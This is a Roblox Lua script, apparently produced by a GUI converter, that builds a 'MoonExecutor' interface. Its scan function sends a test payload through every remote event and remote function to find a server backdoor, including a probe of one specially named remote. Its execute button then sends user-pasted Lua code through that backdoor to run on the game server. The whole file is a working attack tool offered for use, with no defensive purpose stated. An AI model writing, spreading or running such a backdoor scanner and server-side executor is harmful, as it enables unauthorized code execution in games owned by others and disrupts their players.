--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 

designed using localmaze gui creator
]=]

-- Instances: 23 | Scripts: 4 | Modules: 0 | Tags: 0
local LMG2L = {};

-- Players.KHAFIDZKTP.PlayerGui.ScreenGui
LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame
LMG2L["MenuInjectFrame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["MenuInjectFrame_2"]["BorderSizePixel"] = 0;
LMG2L["MenuInjectFrame_2"]["BackgroundColor3"] = Color3.fromRGB(6, 20, 57);
LMG2L["MenuInjectFrame_2"]["Size"] = UDim2.new(0.4043, 0, 0.39197, 0);
LMG2L["MenuInjectFrame_2"]["Position"] = UDim2.new(0.30586, 0, 0.29704, 0);
LMG2L["MenuInjectFrame_2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["MenuInjectFrame_2"]["Name"] = [[MenuInjectFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning 
LMG2L["Scanning _3"] = Instance.new("TextButton", LMG2L["MenuInjectFrame_2"]);
LMG2L["Scanning _3"]["TextWrapped"] = true;
LMG2L["Scanning _3"]["TextStrokeTransparency"] = 0;
LMG2L["Scanning _3"]["RichText"] = true;
LMG2L["Scanning _3"]["BorderSizePixel"] = 0;
LMG2L["Scanning _3"]["TextScaled"] = true;
LMG2L["Scanning _3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Scanning _3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["Scanning _3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Scanning _3"]["Size"] = UDim2.new(0.7913, 0, 0.58594, 0);
LMG2L["Scanning _3"]["Text"] = [[Scan Now]];
LMG2L["Scanning _3"]["Name"] = [[Scanning ]];
LMG2L["Scanning _3"]["Position"] = UDim2.new(0.11304, 0, 0.21875, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UICorner
LMG2L["UICorner_4"] = Instance.new("UICorner", LMG2L["Scanning _3"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
LMG2L["ScanScript_5"] = Instance.new("LocalScript", LMG2L["Scanning _3"]);
LMG2L["ScanScript_5"]["Name"] = [[ScanScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UIStroke
LMG2L["UIStroke_6"] = Instance.new("UIStroke", LMG2L["Scanning _3"]);
LMG2L["UIStroke_6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_6"]["Color"] = Color3.fromRGB(227, 12, 237);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UICorner
LMG2L["UICorner_7"] = Instance.new("UICorner", LMG2L["MenuInjectFrame_2"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIAspectRatioConstraint
LMG2L["UIAspectRatioConstraint_8"] = Instance.new("UIAspectRatioConstraint", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIAspectRatioConstraint_8"]["AspectRatio"] = 1.79688;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.MoonExecutorText
LMG2L["MoonExecutorText_9"] = Instance.new("TextLabel", LMG2L["MenuInjectFrame_2"]);
LMG2L["MoonExecutorText_9"]["TextWrapped"] = true;
LMG2L["MoonExecutorText_9"]["TextStrokeTransparency"] = 0;
LMG2L["MoonExecutorText_9"]["BorderSizePixel"] = 0;
LMG2L["MoonExecutorText_9"]["TextScaled"] = true;
LMG2L["MoonExecutorText_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MoonExecutorText_9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["MoonExecutorText_9"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
LMG2L["MoonExecutorText_9"]["BackgroundTransparency"] = 1;
LMG2L["MoonExecutorText_9"]["Size"] = UDim2.new(0.99565, 0, 0.17969, 0);
LMG2L["MoonExecutorText_9"]["Text"] = [[MoonExecutor]];
LMG2L["MoonExecutorText_9"]["Name"] = [[MoonExecutorText]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIStroke
LMG2L["UIStroke_a"] = Instance.new("UIStroke", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIStroke_a"]["Color"] = Color3.fromRGB(255, 0, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.DraggingScript
LMG2L["DraggingScript_b"] = Instance.new("LocalScript", LMG2L["MenuInjectFrame_2"]);
LMG2L["DraggingScript_b"]["Name"] = [[DraggingScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame
LMG2L["MainFrame_c"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["MainFrame_c"]["Visible"] = false;
LMG2L["MainFrame_c"]["BorderSizePixel"] = 0;
LMG2L["MainFrame_c"]["BackgroundColor3"] = Color3.fromRGB(85, 85, 85);
LMG2L["MainFrame_c"]["Size"] = UDim2.new(0.50977, 0, 0.54815, 0);
LMG2L["MainFrame_c"]["Position"] = UDim2.new(0.24961, 0, 0.25723, 0);
LMG2L["MainFrame_c"]["Name"] = [[MainFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.Versi
LMG2L["Versi_d"] = Instance.new("TextLabel", LMG2L["MainFrame_c"]);
LMG2L["Versi_d"]["TextWrapped"] = true;
LMG2L["Versi_d"]["BorderSizePixel"] = 0;
LMG2L["Versi_d"]["TextTransparency"] = 0.6;
LMG2L["Versi_d"]["TextScaled"] = true;
LMG2L["Versi_d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Versi_d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Zekton.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["Versi_d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Versi_d"]["BackgroundTransparency"] = 1;
LMG2L["Versi_d"]["RichText"] = true;
LMG2L["Versi_d"]["Size"] = UDim2.new(0.11379, 0, 0.0838, 0);
LMG2L["Versi_d"]["Text"] = [[v0.0.1]];
LMG2L["Versi_d"]["Name"] = [[Versi]];
LMG2L["Versi_d"]["Position"] = UDim2.new(0.87931, 0, 0.90503, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UICorner
LMG2L["UICorner_e"] = Instance.new("UICorner", LMG2L["MainFrame_c"]);
LMG2L["UICorner_e"]["CornerRadius"] = UDim.new(0.01, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UIAspectRatioConstraint
LMG2L["UIAspectRatioConstraint_f"] = Instance.new("UIAspectRatioConstraint", LMG2L["MainFrame_c"]);
LMG2L["UIAspectRatioConstraint_f"]["AspectRatio"] = 1.62011;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UIStroke
LMG2L["UIStroke_10"] = Instance.new("UIStroke", LMG2L["MainFrame_c"]);
LMG2L["UIStroke_10"]["Thickness"] = 7;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton
LMG2L["ExecuteButton_11"] = Instance.new("TextButton", LMG2L["MainFrame_c"]);
LMG2L["ExecuteButton_11"]["TextWrapped"] = true;
LMG2L["ExecuteButton_11"]["BorderSizePixel"] = 0;
LMG2L["ExecuteButton_11"]["TextScaled"] = true;
LMG2L["ExecuteButton_11"]["TextColor3"] = Color3.fromRGB(22, 255, 19);
LMG2L["ExecuteButton_11"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
LMG2L["ExecuteButton_11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["ExecuteButton_11"]["Size"] = UDim2.new(0.18276, 0, 0.10615, 0);
LMG2L["ExecuteButton_11"]["Text"] = [[Execute]];
LMG2L["ExecuteButton_11"]["Name"] = [[ExecuteButton]];
LMG2L["ExecuteButton_11"]["Position"] = UDim2.new(0.0931, 0, 0.85475, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.UICorner
LMG2L["UICorner_12"] = Instance.new("UICorner", LMG2L["ExecuteButton_11"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.EXECUTESCRIPT
LMG2L["EXECUTESCRIPT_13"] = Instance.new("LocalScript", LMG2L["ExecuteButton_11"]);
LMG2L["EXECUTESCRIPT_13"]["Name"] = [[EXECUTESCRIPT]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.MoonExecutor
LMG2L["MoonExecutor_14"] = Instance.new("TextLabel", LMG2L["MainFrame_c"]);
LMG2L["MoonExecutor_14"]["TextWrapped"] = true;
LMG2L["MoonExecutor_14"]["TextStrokeTransparency"] = 0;
LMG2L["MoonExecutor_14"]["BorderSizePixel"] = 0;
LMG2L["MoonExecutor_14"]["TextScaled"] = true;
LMG2L["MoonExecutor_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MoonExecutor_14"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["MoonExecutor_14"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
LMG2L["MoonExecutor_14"]["BackgroundTransparency"] = 1;
LMG2L["MoonExecutor_14"]["Size"] = UDim2.new(0.78966, 0, 0.12849, 0);
LMG2L["MoonExecutor_14"]["Text"] = [[MoonExecutor]];
LMG2L["MoonExecutor_14"]["Name"] = [[MoonExecutor]];
LMG2L["MoonExecutor_14"]["Position"] = UDim2.new(0.11379, 0, -0.00559, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.CoderBox
LMG2L["CoderBox_15"] = Instance.new("TextBox", LMG2L["MainFrame_c"]);
LMG2L["CoderBox_15"]["Name"] = [[CoderBox]];
LMG2L["CoderBox_15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["CoderBox_15"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CoderBox_15"]["BorderSizePixel"] = 0;
LMG2L["CoderBox_15"]["TextWrapped"] = true;
LMG2L["CoderBox_15"]["TextSize"] = 18;
LMG2L["CoderBox_15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CoderBox_15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["CoderBox_15"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["CoderBox_15"]["RichText"] = true;
LMG2L["CoderBox_15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["CoderBox_15"]["MultiLine"] = true;
LMG2L["CoderBox_15"]["PlaceholderText"] = [[Paste Your Script Here!]];
LMG2L["CoderBox_15"]["Size"] = UDim2.new(0.84828, 0, 0.65922, 0);
LMG2L["CoderBox_15"]["Position"] = UDim2.new(0.08621, 0, 0.12291, 0);
LMG2L["CoderBox_15"]["Text"] = [[Paste Your Script Here]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.CoderBox.UICorner
LMG2L["UICorner_16"] = Instance.new("UICorner", LMG2L["CoderBox_15"]);
LMG2L["UICorner_16"]["CornerRadius"] = UDim.new(0, 1);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.DraggingScript
LMG2L["DraggingScript_17"] = Instance.new("LocalScript", LMG2L["MainFrame_c"]);
LMG2L["DraggingScript_17"]["Name"] = [[DraggingScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
local function C_5()
	local script = LMG2L["ScanScript_5"];
	local button = script.Parent	
	local player = game.Players.LocalPlayer	
	local playerGui = player:WaitForChild("PlayerGui")	
	
	local isScanning = false	
	
	local function runRemote(remote, data)	
		if remote:IsA("RemoteEvent") then	
			remote:FireServer(data)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function() remote:InvokeServer(data) end)	
		end	
	end	
	
	local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}	
	local function generateName(length)	
		local text = ""	
		for i = 1, length do	
			text = text .. alphabet[math.random(1, #alphabet)]	
		end	
		return text	
	end	
	
	local function findBackdoor()	
		local remotes = {}	
	
		local protected = game:GetService("ReplicatedStorage"):FindFirstChild("lh" .. game.PlaceId / 6666 * 1337 * game.PlaceId)	
		if protected and protected:IsA("RemoteFunction") then	
			local code = generateName(math.random(12, 30))	
			task.spawn(function()	
				protected:InvokeServer("lalol", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			end)	
			remotes[code] = protected	
		end	
	
		for _, remote in game:GetDescendants() do	
			if not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction") then continue end	
			if string.split(remote:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then continue end	
	
			local rs = game:GetService("ReplicatedStorage")	
			if remote.Parent == rs or remote.Parent.Parent == rs or remote.Parent.Parent.Parent == rs then	
				if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then continue end	
				if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then continue end	
				if remote.Parent.Name == "DefaultChatSystemChatEvents" then continue end	
			end	
	
			local code = generateName(math.random(12, 30))	
			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			remotes[code] = remote	
		end	
	
		for i = 1, 100 do	
			for code, remote in remotes do	
				if workspace:FindFirstChild(code) then	
					return remote	
				end	
			end	
			task.wait()	
		end	
	
		return nil	
	end	
	
	button.MouseButton1Click:Connect(function()	
		if isScanning then return end	
		isScanning = true	
	
		button.TextColor3 = Color3.fromRGB(255, 255, 255)	
	
		local startTime = tick()	
		task.spawn(function()	
			while isScanning and (tick() - startTime) < 5 do	
				button.Text = "Scan." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan.." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan..." task.wait(0.4)	
			end	
		end)	
	
		local backdoor = findBackdoor()	
	
		local screenGui = button:FindFirstAncestorOfClass("ScreenGui")	
		local mainFrame = screenGui and screenGui:FindFirstChild("MainFrame")	
		local menuInjectFrame = button.Parent	
	
		isScanning = false	
	
		if backdoor and mainFrame then	
			_G.MoonBackdoor = backdoor	
	
			button.Text = "Found!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
	
			task.wait(0.5)	
	
			local hint = Instance.new("Hint")	
			hint.Text = "Thanks for using my executor! | By KHAFIDZKTP"	
			hint.Parent = player.Character	
	
			mainFrame.Visible = true	
			menuInjectFrame.Visible = false	
	
			task.wait(5)	
			hint:Destroy()	
		else	
			button.TextColor3 = Color3.fromRGB(255, 0, 0)	
			if not backdoor then	
				button.Text = "No Backdoor Found :("	
			else	
				button.Text = "MainFrame Not Found :("	
			end	
		end	
	end)	
end;
task.spawn(C_5);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.DraggingScript
local function C_b()
	local script = LMG2L["DraggingScript_b"];
	local frame = script.Parent -- MainFrame	
	local UIS = game:GetService("UserInputService")	
	
	local dragging = false	
	local dragStart, startPos	
	
	frame.InputBegan:Connect(function(input)	
		if input.UserInputType == Enum.UserInputType.MouseButton1 	
			or input.UserInputType == Enum.UserInputType.Touch then	
			dragging = true	
			dragStart = input.Position	
			startPos = frame.Position	
	
			input.Changed:Connect(function()	
				if input.UserInputState == Enum.UserInputState.End then	
					dragging = false	
				end	
			end)	
		end	
	end)	
	
	UIS.InputChanged:Connect(function(input)	
		if dragging and (	
			input.UserInputType == Enum.UserInputType.MouseMovement or 	
			input.UserInputType == Enum.UserInputType.Touch	
		) then	
			local delta = input.Position - dragStart	
			frame.Position = UDim2.new(	
				startPos.X.Scale, startPos.X.Offset + delta.X,	
				startPos.Y.Scale, startPos.Y.Offset + delta.Y	
			)	
		end	
	end)	
end;
task.spawn(C_b);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.EXECUTESCRIPT
local function C_13()
	local script = LMG2L["EXECUTESCRIPT_13"];
	local button = script.Parent	
	local mainFrame = button.Parent -- ExecuteButton > MainFrame	
	local coderBox = mainFrame:WaitForChild("CoderBox")	
	local player = game.Players.LocalPlayer	
	
	local function runRemote(remote, code)	
		if remote:IsA("RemoteEvent") then	
			remote:FireServer(code)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function()	
				local ok, result = pcall(function()	
					return remote:InvokeServer(code)	
				end)	
				if ok and result ~= nil then	
					warn("[MoonExecutor] Response: " .. tostring(result))	
				end	
			end)	
		end	
	end	
	
	button.MouseButton1Click:Connect(function()	
		local backdoor = _G.MoonBackdoor	
	
		if not backdoor then	
			button.Text = "No Backdoor!"	
			button.TextColor3 = Color3.fromRGB(255, 80, 80)	
			task.wait(1.5)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
			return	
		end	
	
		local code = string.gsub(coderBox.Text, "%%username%%", player.Name)	
	
		if code ~= "" then	
			button.Text = "Running..."	
			button.TextColor3 = Color3.fromRGB(255, 255, 0)	
			runRemote(backdoor, code)	
			task.wait(0.5)	
			button.Text = "Executed!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
			task.wait(1.5)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
		else	
			button.Text = "Empty!"	
			button.TextColor3 = Color3.fromRGB(255, 100, 100)	
			task.wait(1)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
		end	
	end)	
end;
task.spawn(C_13);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.DraggingScript
local function C_17()
	local script = LMG2L["DraggingScript_17"];
	local frame = script.Parent -- MainFrame	
	local UIS = game:GetService("UserInputService")	
	
	local dragging = false	
	local dragStart, startPos	
	
	frame.InputBegan:Connect(function(input)	
		if input.UserInputType == Enum.UserInputType.MouseButton1 	
			or input.UserInputType == Enum.UserInputType.Touch then	
			dragging = true	
			dragStart = input.Position	
			startPos = frame.Position	
	
			input.Changed:Connect(function()	
				if input.UserInputState == Enum.UserInputState.End then	
					dragging = false	
				end	
			end)	
		end	
	end)	
	
	UIS.InputChanged:Connect(function(input)	
		if dragging and (	
			input.UserInputType == Enum.UserInputType.MouseMovement or 	
			input.UserInputType == Enum.UserInputType.Touch	
		) then	
			local delta = input.Position - dragStart	
			frame.Position = UDim2.new(	
				startPos.X.Scale, startPos.X.Offset + delta.X,	
				startPos.Y.Scale, startPos.Y.Offset + delta.Y	
			)	
		end	
	end)	
end;
task.spawn(C_17);

return LMG2L["ScreenGui_1"], require;
